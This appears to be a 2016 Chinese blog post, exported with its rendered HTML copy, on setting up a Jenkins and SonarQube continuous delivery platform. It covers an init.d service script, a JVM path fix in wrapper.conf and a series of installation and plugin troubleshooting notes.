SonarQube+Jenkins,搭建持续交付平台\ntags:\n  - sonar\n  - jenkins\ncategories:\n  - 运维部署\ndate: 2016-6-10 22:22:00\ntoc: false\n---\n\n### 前言\nKurt Bittner曾说过，如果敏捷仅仅只是开始，那持续交付就是头条! \n*“If Agile Was the Opening Act, Continuous Delivery is the Headliner!”——Kurt Bittner*\n\n五月上旬我的一个主要工作就是搭建持续交付平台。\n打算以Jenkins为核心，每天定时从代码库中检出最新的代码进行编译、构建。构建结果通过自动发送的邮件通知到项目组，开发人员每天只需关心最新的集成结果是否正确即可。\n\n再搭建SonarQube代码质量检测工具，单位时间定时扫描代码库最新代码，检测出代码中的存在的阻断错误、严重错误、主要错误、次要错误和相关提示信息。通过SonarQube能有效简洁统一代码风格，利于大家更好的相互理解和后期排查。\n\n以下是搭建过程中用到的相关网站及碰到的坑。\n\n---\n\n### 相关网站\nSonar官方网站：[http://www.sonarqube.org/](http://www.sonarqube.org/)\nJenkins官方使用教程：[https://wiki.jenkins-ci.org/display/JENKINS/Use+Jenkins](https://wiki.jenkins-ci.org/display/JENKINS/Use+Jenkins)\nJenkins安装链接：[http://www.cnblogs.com/zhangqingsh/archive/2013/03/19/2968998.html](http://www.cnblogs.com/zhangqingsh/archive/2013/03/19/2968998.html)\nSonar安装链接：[http://flyingdutchman.iteye.com/blog/1905906](http://flyingdutchman.iteye.com/blog/1905906)\nSonar简介及安装地址：[http://www.ibm.com/developerworks/cn/opensource/os-sonarqube/](http://www.ibm.com/developerworks/cn/opensource/os-sonarqube/)\nJenkins使用集锦：[http://my.oschina.net/u/260244/blog/318755?fromerr=ZvUu6dmF](http://my.oschina.net/u/260244/blog/318755?fromerr=ZvUu6dmF)\nJenkins和Sonar整合地址1：[https://lasithapetthawadu.wordpress.com/2014/05/03/configure-jenkins-with-sonarqube-for-static-code-analysis-and-integration/](https://lasithapetthawadu.wordpress.com/2014/05/03/configure-jenkins-with-sonarqube-for-static-code-analysis-and-integration/)\nJenkins和Sonar整合地址2：[http://www.cnblogs.com/zhuhongbao/p/4197974.html](http://www.cnblogs.com/zhuhongbao/p/4197974.html)\n搭建过程中涉及到的 JDK、Tomcat、Mysql、Redis、Maven等系列安装链接省略  0.0！\n\n<!-- more -->\n\n---\n\n### sonar添加service服务\n```bash\n# 编写简单的sonar启动脚本\nvim /etc/init.d/sonar\n\n[sonar]\n#!/bin/sh  \nstart()  \n{  \n        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start\n}  \nstop()  \n{  \n        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh stop\n}\nstatus()  \n{       \n        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh status\n}\nrestart()  \n{  \n        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh restart\n} \nSONAR=\"/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh\"\n[ -f $SONAR ] || exit 1  \n# See how we were called.  \ncase \"$1\" in  \n        start)  \n                start  \n                ;;  \n        stop)  \n                stop  \n                ;;  \n        restart)  \n                restart\n                ;;  \n        status)  \n                status \n                ;;  \n                # stop    sleep 3   start  ;;  \n        *)  \n                echo $\"Usage: $0 {start|stop|status|restart}\"  \n                exit 1  \nesac  \nexit 0 \n\n\n# sonar服务验证\nservice sonar status\nservice sonar start\nservice sonar restart\nservice sonar stop\n\n```\n\n**问题：**<font style=\"color:red\">验证service服务时，发现四个命令唯独 service sonar start 命令失败，但是手动输入下面命令却可以启动成功【添加sonar自启动服务时也出现同样问题】。</font>\n```bash\n/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start\n```\n\n我们查看相关日志：\n```bash\n#tail -f /data/sonar/sonarqube-5.6.1/logs/sonar.log\n--> Wrapper Started as Daemon\nLaunching a JVM...\nUnable to start JVM: No such file or directory (2)\nJVM exited while loading the application.\nJVM Restarts disabled.  Shutting down.\n<-- Wrapper Stopped\n```\n\nlog提示不能加载JVM，接着查看sonar的wrapper.conf文件\n```bash\nvim /data/sonar/sonarqube-5.6.1/conf/wrapper.conf\n\n# Path to JVM executable. By default it must be available in PATH.\n# Can be an absolute path, for example:\n#wrapper.java.command=/path/to/my/jdk/bin/java\nwrapper.java.command=/java\n```\n\nwrapper.conf文件提示wrapper.java.command需要配置java路径，默认路径显然有误，修改后，再次运行【service sonar start】，操作成功。\n```bash\nwrapper.java.command=/usr/java/jdk1.8.0_31/bin/java\n```\n---\n\n### 系列问题\n**问题：通过命令直接安装Jenkins，连接被拒绝时**\n**方案：**手动下载包，下载地址：[http://mirrors.jenkins-ci.org/war/](http://mirrors.jenkins-ci.org/war/)\n\n**问题：Jenkins安装完成后启动报错**\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/1.png)\n**方案：**通过\"vi /etc/init.d/jenkins\"，把JDK的java路径加上即可\n**注意：**Jenkins启动后自动部署Tomcat，Tomcat需先启动\n<!--more-->\n\n**问题：Sonar无法启动，Failed to start SonarQube.**\n**方案：**切换成root用户启动试试，可能是没有权限。\n\n**问题：Sonar中文乱码问题**\n**方案：**sonar-run配置有问题，里面的jdbc配置是：\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/2.png)\n\n\n**问题：Sonar某个版本安装成功后，启动却总只显示一个页面，并提示Sonar正在维护中**\n**方案：**无需更换版本，仔细查看发现该提示页面可以直接点击进行相关插件的自动升级，重启后首页即可访问。\n\n**问题：Sonar成功启动后，却总是马上自动关闭服务**\n**方案：**很可能是没有启动mysql服务，启动即可。\n\n**问题：Sonar成功运行后，如何显示中文?**\n**方案：**在Settings/SYSTEM/Update Center/Available Plugins下安装汉化包，并重新启动Sonar。\n**注意：**当某些插件总是下载失败时，可以直接搜索插件名手动下载，并在【系统管理--管理插件--高级--浏览-上传插件】中上传插件即可。\n\n**问题：Jenkins集成Sonar后，Sonar无法扫描Java语言代码**\n**方案：**在Sonar的Settings/SYSTEM/Update Center/Available目录下下载Java语言包，并重新启动Jenkins和Sonar。Jenkins会根据配置的扫描路径，定时扫描相关代码，并在Sonar中可视化。\n**注意：**SonarQube集成Java插件官方地址：[http://docs.sonarqube.org/display/PLUG/Java+Plugin](http://docs.sonarqube.org/display/PLUG/Java+Plugin)\n\n**问题：下载某语言包后，Sonar重启仍然无法扫描相关代码**\n**原因：**如下载\"C/C++/Objective-c\"这个插件后，重新启动扫描C代码总是报错：\n```bash\nCaused by: org.sonar.api.utils.SonarException: No license for cpp\n```\n原以为是需要安装cpp插件，后来才发现重点是No license，意思就是需要付费购买许可证。\n网上搜索免费许可证无果，然后点击\"Get trial key\", 结果立马收到官方邮件回复被拒，终放弃。\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/3.png)\n\n**问题：Jenkins集成Sonar后，Jenkins自动化脚本执行失败，并报如下错误**\n**方案：**更换插件版本即可，下次安装需要注意。\n\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/4.png)\n\n**问题：Jenkins账户权限如何分配**\n**方案：** 相关链接：[http://www.360doc.com/content/13/0802/14/7811581_304255550.shtml](http://www.360doc.com/content/13/0802/14/7811581_304255550.shtml)\n**注意：** 如果用admin账户登录，在分配权限的时候，将admin权限全部置空，一旦退出，将无法使用 0.0！我当初的解决方法是修改远程配置文件，而如果配置文件一旦改乱，就只能重装了。\n\n### 运行结果\n**Sonar成功运行如图五图六所示，其中代码检测规则可以修改也可以自定义，对于图六显示出的具体错误，Sonar也可在页面直接分配给某个组员修改**\n\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/5.png)\n![图片6](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/6.png)\n\n<br/>","slug":"SonarQube+Jenkins,搭建持续交付平台","published":1,"updated":"2016-11-21T03:53:53.844Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulcf002hgwtmf3ox0ma9","content":"<h3 id=\"&#x524D;&#x8A00;\"><a href=\"#&#x524D;&#x8A00;\" class=\"headerlink\" title=\"&#x524D;&#x8A00;\"></a>&#x524D;&#x8A00;</h3><p>Kurt Bittner&#x66FE;&#x8BF4;&#x8FC7;&#xFF0C;&#x5982;&#x679C;&#x654F;&#x6377;&#x4EC5;&#x4EC5;&#x53EA;&#x662F;&#x5F00;&#x59CB;&#xFF0C;&#x90A3;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#x5C31;&#x662F;&#x5934;&#x6761;!<br><em>&#x201C;If Agile Was the Opening Act, Continuous Delivery is the Headliner!&#x201D;&#x2014;&#x2014;Kurt Bittner</em></p>\n<p>&#x4E94;&#x6708;&#x4E0A;&#x65EC;&#x6211;&#x7684;&#x4E00;&#x4E2A;&#x4E3B;&#x8981;&#x5DE5;&#x4F5C;&#x5C31;&#x662F;&#x642D;&#x5EFA;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#x5E73;&#x53F0;&#x3002;<br>&#x6253;&#x7B97;&#x4EE5;Jenkins&#x4E3A;&#x6838;&#x5FC3;&#xFF0C;&#x6BCF;&#x5929;&#x5B9A;&#x65F6;&#x4ECE;&#x4EE3;&#x7801;&#x5E93;&#x4E2D;&#x68C0;&#x51FA;&#x6700;&#x65B0;&#x7684;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x7F16;&#x8BD1;&#x3001;&#x6784;&#x5EFA;&#x3002;&#x6784;&#x5EFA;&#x7ED3;&#x679C;&#x901A;&#x8FC7;&#x81EA;&#x52A8;&#x53D1;&#x9001;&#x7684;&#x90AE;&#x4EF6;&#x901A;&#x77E5;&#x5230;&#x9879;&#x76EE;&#x7EC4;&#xFF0C;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x6BCF;&#x5929;&#x53EA;&#x9700;&#x5173;&#x5FC3;&#x6700;&#x65B0;&#x7684;&#x96C6;&#x6210;&#x7ED3;&#x679C;&#x662F;&#x5426;&#x6B63;&#x786E;&#x5373;&#x53EF;&#x3002;</p>\n<p>&#x518D;&#x642D;&#x5EFA;SonarQube&#x4EE3;&#x7801;&#x8D28;&#x91CF;&#x68C0;&#x6D4B;&#x5DE5;&#x5177;&#xFF0C;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5B9A;&#x65F6;&#x626B;&#x63CF;&#x4EE3;&#x7801;&#x5E93;&#x6700;&#x65B0;&#x4EE3;&#x7801;&#xFF0C;&#x68C0;&#x6D4B;&#x51FA;&#x4EE3;&#x7801;&#x4E2D;&#x7684;&#x5B58;&#x5728;&#x7684;&#x963B;&#x65AD;&#x9519;&#x8BEF;&#x3001;&#x4E25;&#x91CD;&#x9519;&#x8BEF;&#x3001;&#x4E3B;&#x8981;&#x9519;&#x8BEF;&#x3001;&#x6B21;&#x8981;&#x9519;&#x8BEF;&#x548C;&#x76F8;&#x5173;&#x63D0;&#x793A;&#x4FE1;&#x606F;&#x3002;&#x901A;&#x8FC7;SonarQube&#x80FD;&#x6709;&#x6548;&#x7B80;&#x6D01;&#x7EDF;&#x4E00;&#x4EE3;&#x7801;&#x98CE;&#x683C;&#xFF0C;&#x5229;&#x4E8E;&#x5927;&#x5BB6;&#x66F4;&#x597D;&#x7684;&#x76F8;&#x4E92;&#x7406;&#x89E3;&#x548C;&#x540E;&#x671F;&#x6392;&#x67E5;&#x3002;</p>\n<p>&#x4EE5;&#x4E0B;&#x662F;&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x7F51;&#x7AD9;&#x53CA;&#x78B0;&#x5230;&#x7684;&#x5751;&#x3002;</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"><a href=\"#&#x76F8;&#x5173;&#x7F51;&#x7AD9;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"></a>&#x76F8;&#x5173;&#x7F51;&#x7AD9;</h3><p>Sonar&#x5B98;&#x65B9;&#x7F51;&#x7AD9;&#xFF1A;<a href=\"http://www.sonarqube.org/\" target=\"_blank\" rel=\"external\">http://www.sonarqube.org/</a><br>Jenkins&#x5B98;&#x65B9;&#x4F7F;&#x7528;&#x6559;&#x7A0B;&#xFF1A;<a href=\"https://wiki.jenkins-ci.org/display/JENKINS/Use+Jenkins\" target=\"_blank\" rel=\"external\">https://wiki.jenkins-ci.org/display/JENKINS/Use+Jenkins</a><br>Jenkins&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#xFF1A;<a href=\"http://www.cnblogs.com/zhangqingsh/archive/2013/03/19/2968998.html\" target=\"_blank\" rel=\"external\">http://www.cnblogs.com/zhangqingsh/archive/2013/03/19/2968998.html</a><br>Sonar&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#xFF1A;<a href=\"http://flyingdutchman.iteye.com/blog/1905906\" target=\"_blank\" rel=\"external\">http://flyingdutchman.iteye.com/blog/1905906</a><br>Sonar&#x7B80;&#x4ECB;&#x53CA;&#x5B89;&#x88C5;&#x5730;&#x5740;&#xFF1A;<a href=\"http://www.ibm.com/developerworks/cn/opensource/os-sonarqube/\" target=\"_blank\" rel=\"external\">http://www.ibm.com/developerworks/cn/opensource/os-sonarqube/</a><br>Jenkins&#x4F7F;&#x7528;&#x96C6;&#x9526;&#xFF1A;<a href=\"http://my.oschina.net/u/260244/blog/318755?fromerr=ZvUu6dmF\" target=\"_blank\" rel=\"external\">http://my.oschina.net/u/260244/blog/318755?fromerr=ZvUu6dmF</a><br>Jenkins&#x548C;Sonar&#x6574;&#x5408;&#x5730;&#x5740;1&#xFF1A;<a href=\"https://lasithapetthawadu.wordpress.com/2014/05/03/configure-jenkins-with-sonarqube-for-static-code-analysis-and-integration/\" target=\"_blank\" rel=\"external\">https://lasithapetthawadu.wordpress.com/2014/05/03/configure-jenkins-with-sonarqube-for-static-code-analysis-and-integration/</a><br>Jenkins&#x548C;Sonar&#x6574;&#x5408;&#x5730;&#x5740;2&#xFF1A;<a href=\"http://www.cnblogs.com/zhuhongbao/p/4197974.html\" target=\"_blank\" rel=\"external\">http://www.cnblogs.com/zhuhongbao/p/4197974.html</a><br>&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x6D89;&#x53CA;&#x5230;&#x7684; JDK&#x3001;Tomcat&#x3001;Mysql&#x3001;Redis&#x3001;Maven&#x7B49;&#x7CFB;&#x5217;&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#x7701;&#x7565;  0.0&#xFF01;</p>\n<a id=\"more\"></a>\n<hr>\n<h3 id=\"sonar&#x6DFB;&#x52A0;service&#x670D;&#x52A1;\"><a href=\"#sonar&#x6DFB;&#x52A0;service&#x670D;&#x52A1;\" class=\"headerlink\" title=\"sonar&#x6DFB;&#x52A0;service&#x670D;&#x52A1;\"></a>sonar&#x6DFB;&#x52A0;service&#x670D;&#x52A1;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x7F16;&#x5199;&#x7B80;&#x5355;&#x7684;sonar&#x542F;&#x52A8;&#x811A;&#x672C;</span></span><br><span class=\"line\">vim /etc/init.d/sonar</span><br><span class=\"line\"></span><br><span class=\"line\">[sonar]</span><br><span class=\"line\"><span class=\"meta\">#!/bin/sh  </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">start</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start</span><br><span class=\"line\">}  </span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">stop</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh stop</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">status</span></span>()  </span><br><span class=\"line\">{       </span><br><span class=\"line\">        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh status</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">restart</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh restart</span><br><span class=\"line\">} </span><br><span class=\"line\">SONAR=<span class=\"string\">&quot;/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh&quot;</span></span><br><span class=\"line\">[ <span class=\"_\">-f</span> <span class=\"variable\">$SONAR</span> ] || <span class=\"built_in\">exit</span> 1  </span><br><span class=\"line\"><span class=\"comment\"># See how we were called.  </span></span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&quot;<span class=\"variable\">$1</span>&quot;</span> <span class=\"keyword\">in</span>  </span><br><span class=\"line\">        start)  </span><br><span class=\"line\">                start  </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        stop)  </span><br><span class=\"line\">                stop  </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        restart)  </span><br><span class=\"line\">                restart</span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        status)  </span><br><span class=\"line\">                status </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">                <span class=\"comment\"># stop    sleep 3   start  ;;  </span></span><br><span class=\"line\">        *)  </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> $<span class=\"string\">&quot;Usage: <span class=\"variable\">$0</span> {start|stop|status|restart}&quot;</span>  </span><br><span class=\"line\">                <span class=\"built_in\">exit</span> 1  </span><br><span class=\"line\"><span class=\"keyword\">esac</span>  </span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sonar&#x670D;&#x52A1;&#x9A8C;&#x8BC1;</span></span><br><span class=\"line\">service sonar status</span><br><span class=\"line\">service sonar start</span><br><span class=\"line\">service sonar restart</span><br><span class=\"line\">service sonar stop</span><br></pre></td></tr></table></figure>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;</strong><font style=\"color:red\">&#x9A8C;&#x8BC1;service&#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x53D1;&#x73B0;&#x56DB;&#x4E2A;&#x547D;&#x4EE4;&#x552F;&#x72EC; service sonar start &#x547D;&#x4EE4;&#x5931;&#x8D25;&#xFF0C;&#x4F46;&#x662F;&#x624B;&#x52A8;&#x8F93;&#x5165;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x5374;&#x53EF;&#x4EE5;&#x542F;&#x52A8;&#x6210;&#x529F;&#x3010;&#x6DFB;&#x52A0;sonar&#x81EA;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x65F6;&#x4E5F;&#x51FA;&#x73B0;&#x540C;&#x6837;&#x95EE;&#x9898;&#x3011;&#x3002;</font><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start</span><br></pre></td></tr></table></figure></p>\n<p>&#x6211;&#x4EEC;&#x67E5;&#x770B;&#x76F8;&#x5173;&#x65E5;&#x5FD7;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#tail -f /data/sonar/sonarqube-5.6.1/logs/sonar.log</span></span><br><span class=\"line\">--&gt; Wrapper Started as Daemon</span><br><span class=\"line\">Launching a JVM...</span><br><span class=\"line\">Unable to start JVM: No such file or directory (2)</span><br><span class=\"line\">JVM exited <span class=\"keyword\">while</span> loading the application.</span><br><span class=\"line\">JVM Restarts disabled.  Shutting down.</span><br><span class=\"line\">&lt;-- Wrapper Stopped</span><br></pre></td></tr></table></figure></p>\n<p>log&#x63D0;&#x793A;&#x4E0D;&#x80FD;&#x52A0;&#x8F7D;JVM&#xFF0C;&#x63A5;&#x7740;&#x67E5;&#x770B;sonar&#x7684;wrapper.conf&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /data/sonar/sonarqube-5.6.1/conf/wrapper.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Path to JVM executable. By default it must be available in PATH.</span></span><br><span class=\"line\"><span class=\"comment\"># Can be an absolute path, for example:</span></span><br><span class=\"line\"><span class=\"comment\">#wrapper.java.command=/path/to/my/jdk/bin/java</span></span><br><span class=\"line\">wrapper.java.command=/java</span><br></pre></td></tr></table></figure></p>\n<p>wrapper.conf&#x6587;&#x4EF6;&#x63D0;&#x793A;wrapper.java.command&#x9700;&#x8981;&#x914D;&#x7F6E;java&#x8DEF;&#x5F84;&#xFF0C;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;&#x663E;&#x7136;&#x6709;&#x8BEF;&#xFF0C;&#x4FEE;&#x6539;&#x540E;&#xFF0C;&#x518D;&#x6B21;&#x8FD0;&#x884C;&#x3010;service sonar start&#x3011;&#xFF0C;&#x64CD;&#x4F5C;&#x6210;&#x529F;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wrapper.java.command=/usr/java/jdk1.8.0_31/bin/java</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h3 id=\"&#x7CFB;&#x5217;&#x95EE;&#x9898;\"><a href=\"#&#x7CFB;&#x5217;&#x95EE;&#x9898;\" class=\"headerlink\" title=\"&#x7CFB;&#x5217;&#x95EE;&#x9898;\"></a>&#x7CFB;&#x5217;&#x95EE;&#x9898;</h3><p><strong>&#x95EE;&#x9898;&#xFF1A;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x76F4;&#x63A5;&#x5B89;&#x88C5;Jenkins&#xFF0C;&#x8FDE;&#x63A5;&#x88AB;&#x62D2;&#x7EDD;&#x65F6;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#x5305;&#xFF0C;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href=\"http://mirrors.jenkins-ci.org/war/\" target=\"_blank\" rel=\"external\">http://mirrors.jenkins-ci.org/war/</a></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Jenkins&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x542F;&#x52A8;&#x62A5;&#x9519;</strong></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/1.png\" alt=\"&#x56FE;&#x7247;1\"><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x901A;&#x8FC7;&#x201D;vi /etc/init.d/jenkins&#x201D;&#xFF0C;&#x628A;JDK&#x7684;java&#x8DEF;&#x5F84;&#x52A0;&#x4E0A;&#x5373;&#x53EF;<br><strong>&#x6CE8;&#x610F;&#xFF1A;</strong>Jenkins&#x542F;&#x52A8;&#x540E;&#x81EA;&#x52A8;&#x90E8;&#x7F72;Tomcat&#xFF0C;Tomcat&#x9700;&#x5148;&#x542F;&#x52A8;<br><!--more--></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Sonar&#x65E0;&#x6CD5;&#x542F;&#x52A8;&#xFF0C;Failed to start SonarQube.</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x5207;&#x6362;&#x6210;root&#x7528;&#x6237;&#x542F;&#x52A8;&#x8BD5;&#x8BD5;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Sonar&#x4E2D;&#x6587;&#x4E71;&#x7801;&#x95EE;&#x9898;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>sonar-run&#x914D;&#x7F6E;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x91CC;&#x9762;&#x7684;jdbc&#x914D;&#x7F6E;&#x662F;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/2.png\" alt=\"&#x56FE;&#x7247;2\"></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Sonar&#x67D0;&#x4E2A;&#x7248;&#x672C;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x542F;&#x52A8;&#x5374;&#x603B;&#x53EA;&#x663E;&#x793A;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#xFF0C;&#x5E76;&#x63D0;&#x793A;Sonar&#x6B63;&#x5728;&#x7EF4;&#x62A4;&#x4E2D;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x65E0;&#x9700;&#x66F4;&#x6362;&#x7248;&#x672C;&#xFF0C;&#x4ED4;&#x7EC6;&#x67E5;&#x770B;&#x53D1;&#x73B0;&#x8BE5;&#x63D0;&#x793A;&#x9875;&#x9762;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x70B9;&#x51FB;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x63D2;&#x4EF6;&#x7684;&#x81EA;&#x52A8;&#x5347;&#x7EA7;&#xFF0C;&#x91CD;&#x542F;&#x540E;&#x9996;&#x9875;&#x5373;&#x53EF;&#x8BBF;&#x95EE;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Sonar&#x6210;&#x529F;&#x542F;&#x52A8;&#x540E;&#xFF0C;&#x5374;&#x603B;&#x662F;&#x9A6C;&#x4E0A;&#x81EA;&#x52A8;&#x5173;&#x95ED;&#x670D;&#x52A1;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x5F88;&#x53EF;&#x80FD;&#x662F;&#x6CA1;&#x6709;&#x542F;&#x52A8;mysql&#x670D;&#x52A1;&#xFF0C;&#x542F;&#x52A8;&#x5373;&#x53EF;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Sonar&#x6210;&#x529F;&#x8FD0;&#x884C;&#x540E;&#xFF0C;&#x5982;&#x4F55;&#x663E;&#x793A;&#x4E2D;&#x6587;?</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x5728;Settings/SYSTEM/Update Center/Available 